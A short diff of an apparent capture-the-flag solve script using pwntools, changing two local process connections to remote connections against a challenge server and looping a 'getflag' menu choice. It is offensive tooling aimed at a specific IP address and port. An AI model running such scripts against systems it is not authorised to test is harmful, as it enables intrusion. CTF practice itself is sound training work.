@@ -1,12 +1,13 @@
 from pwn import *
 
-p_1 = process("./pwn")
-p_2 = process("./pwn")
 context.log_level = "debug"
 
-p_1.recvuntil("name.\n")
-p_1.send(b'asd')
-p_2.sendafter('name.\n', b'asd')
+p_1 = remote("124.16.75.117", 51007)
+#p_1 = process("./pwn")
+p_1.sendafter("name.\n", b'aaa')
+p_2 = remote("124.16.75.117", 51007)
+#p_2 = process("./pwn")
+p_2.sendafter('name.\n', b'aaa')
 
 for i in range(10):
 	p_1.sendafter('getflag\n', '1\n')
